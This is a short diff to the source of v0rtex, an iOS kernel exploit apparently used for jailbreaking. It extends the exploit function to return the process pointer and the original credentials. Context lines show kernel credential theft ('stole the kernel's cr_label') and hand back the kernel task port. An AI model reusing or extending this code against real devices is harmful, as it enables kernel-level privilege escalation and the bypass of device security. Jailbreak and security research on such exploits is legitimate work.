@@ -432,9 +432,13 @@ typedef union
     } b;
 } ktask_t;
 
-//kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t *selfproc) {
-//kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide) {
-kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred) {
+
+
+//------------------------------------------------------------------------------
+#pragma mark - v0rtex(...)
+//------------------------------------------------------------------------------
+
+kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide, uint64_t *kernucred, uint64_t *selfproc, uint64_t *origcred) {
     kern_return_t retval = KERN_FAILURE, ret;
     task_t self = mach_task_self();
     host_t host = mach_host_self();
@@ -1068,6 +1072,8 @@ fakeobj_buf->a.func = (kptr_t)(addr), \
         goto out4;
     }
     
+    uint64_t orig_cred = self_ucred;
+    
     KCALL(OFF(BCOPY), kern_ucred + OFFSET_UCRED_CR_LABEL, self_ucred + OFFSET_UCRED_CR_LABEL, sizeof(kptr_t), 0, 0, 0, 0);
     LOG("stole the kernel's cr_label");
     
@@ -1217,10 +1223,10 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     *tfp0 = kernel_task;
     *kslide = slide;
     *kernucred = kern_ucred;
-//    *selfproc = self_proc;
+    *selfproc = self_proc;
+    *origcred = orig_cred;
     
     retval = KERN_SUCCESS;
-    
     
     
 out5:;
